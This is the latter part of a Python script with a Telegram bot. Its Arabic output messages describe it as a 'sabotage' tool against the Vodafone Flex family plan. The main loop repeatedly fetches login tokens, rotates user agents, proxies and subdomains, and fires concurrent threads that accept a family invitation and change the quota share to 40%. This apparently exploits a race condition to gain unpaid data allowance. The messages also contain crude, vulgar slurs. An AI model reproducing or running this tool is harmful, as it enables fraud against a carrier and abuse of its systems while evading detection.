        print_success("اكتمل التخريب المتناوب! النظام سمع الفشل في نص الحلقات زي العاهرة! 😈", message.chat.id)
        RUNNING_CYCLES[user_id] = False
        session['running'] = False

# --- CLI Main Function ---
def main():
    open_telegram_channel()
    print_header()
    print_info("أداة تخريب مجموعة فودافون فليكس بفشل نظامي متناوب 😈")
    print_separator()
    print_info("مميزات التخريب:")
    print(f"{SUCCESS_COLOR}✓ فشل نظامي واقعي في تغيير النسبة إلى 40% في دورة آه")
    print(f"✓ نجاح تغيير النسبة في دورة لا")
    print(f"✓ تناوب بين الفشل والنجاح عشان النظام يتلخبط")
    print(f"✓ النظام هيسمع فشل سيستم في نص الحلقات زي العاهرة{RESET}")
    print_separator()

    config = ask_config_option()
    if not config:
        print_error("مش عايز تدخل بيانات؟ النظام هيفضل زبالة! 😜")
        return
    
    print_separator()
    print_success("تم حفظ الإعدادات. جاري بدء التخريب المتناوب...")
    
    print(f"\n{BRIGHT_YELLOW}╔═══════════[ الإعدادات المستخدمة ]═══════════════╗{RESET}")
    print(f"{BRIGHT_YELLOW}║ {CYAN}🔁 عدد التكرارات: {config['total_attempts']}{' ' * 30}{BRIGHT_YELLOW}║")
    print(f"{BRIGHT_YELLOW}║ {CYAN}🔀 ترتيب المهام: {config['task_order']}{' ' * 30}{BRIGHT_YELLOW}║")
    print(f"{BRIGHT_YELLOW}║ {CYAN}🔄 المهام المتزامنة: {config['sync_tasks']}{' ' * 27}{BRIGHT_YELLOW}║")
    print(f"{BRIGHT_YELLOW}║ {CYAN}⏱️ التأخيرات: {json.dumps(config['delays'])}{' ' * 20}{BRIGHT_YELLOW}║")
    print(f"{BRIGHT_YELLOW}╚══════════════════════════════════════════════════╝{RESET}")
    
    cycle_state = "آه"
    for i in range(config['total_attempts']):
        print_separator()
        print(f"{CYAN}╔═══════════[ حلقة التخريب رقم: {i + 1} / {config['total_attempts']} | دورة: {cycle_state} ]═══════════════╗{RESET}")
        
        current_token = get_fresh_token(config['owner_number'], config['owner_password'])
        if not current_token:
            print_error("فشل الحصول على التوكن. بس هنكمل التخريب برضو! 😈")
            continue
            
        current_ua = random.choice(USER_AGENTS)
        current_proxy = random.choice(proxies_list) if config['use_proxies'] and proxies_list else None
        results = {}
        
        member2_token = get_fresh_token(config['member2_number'], config['member2_password'])
        
        for task_id in config['task_order']:
            if task_id == 1:
                change_quota(current_token, config['owner_number'], config['member1_number'], "10", 
                            current_ua, results, 'task1', random.choice(SUBDOMAINS), current_proxy, cycle_state)
                countdown(config['delays']["1"])
                
            elif task_id == 2:
                add_family_member(current_token, config['owner_number'], config['member2_number'], "10", 
                                 current_ua, results, 'task2', random.choice(SUBDOMAINS), 
                                 config['retries_add_remove'], current_proxy)
                countdown(config['delays']["2"])
                
            elif task_id == 3:
                if member2_token:
                    print_info(f"بدء التزامن في دورة {cycle_state}: قبول الدعوة وتغيير الحصة إلى 40%")
                    
                    threads = []
                    t1 = Thread(target=accept_invitation, args=(member2_token, config['owner_number'], 
                                                              config['member2_number'], current_ua, 
                                                              results, 'task3', random.choice(SUBDOMAINS), 
                                                              current_proxy))
                    t2 = Thread(target=change_quota, args=(current_token, config['owner_number'], 
                                                         config['member1_number'], "40", current_ua, 
                                                         results, 'task5', random.choice(SUBDOMAINS), 
                                                         current_proxy, cycle_state))
                    threads.append(t1)
                    threads.append(t2)
                    
                    for t in threads:
                        t.start()
                    
                    for t in threads:
                        t.join()
                    
                    countdown(config['delays']["3"])
                else:
                    print_error("فشل الحصول على توكن العضو الثاني. التخريب مستمر! 😈")
                    
            elif task_id == 4:
                remove_flex_family_member(current_token, config['owner_number'], config['member2_number'], 
                                        current_ua, results, 'task4', random.choice(SUBDOMAINS), 
                                        config['retries_add_remove'], current_proxy)
                
                flex_amount = get_flex_amount(config['owner_number'], config['owner_password'])
                
                countdown(config['delays']["4"])
                
            elif task_id == 5:
                pass

        cycle_state = "لا" if cycle_state == "آه" else "آه"
        
        success_count = sum(1 for res in results.values() if res and res.get('status') in [200, 201, 204])
        fail_count = len(results) - success_count
        show_loop_summary(i+1, config['total_attempts'], success_count, fail_count, flex_amount)

    print_separator()
    print_success("اكتمل التخريب المتناوب! النظام سمع الفشل في نص الحلقات زي العاهرة! 😈")

# --- تشغيل البرنامج ---
if __name__ == "__main__":
    try:
        print("🤖 الكود ليس للبيع لتواصل مع المالك @EL1NINJA ...")
        bot_thread = Thread(target=lambda: bot.infinity_polling())
        bot_thread.start()
        main()
    except KeyboardInterrupt:
        print(f"\n\n{ERROR_COLOR}تم إيقاف البرنامج بواسطة المستخدم{RESET}")
        bot.stop_polling()
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{ERROR_COLOR}حدث خطأ غير متوقع: {e}{RESET}")
        traceback.print_exc()
        bot.stop_polling()
        sys.exit(1)
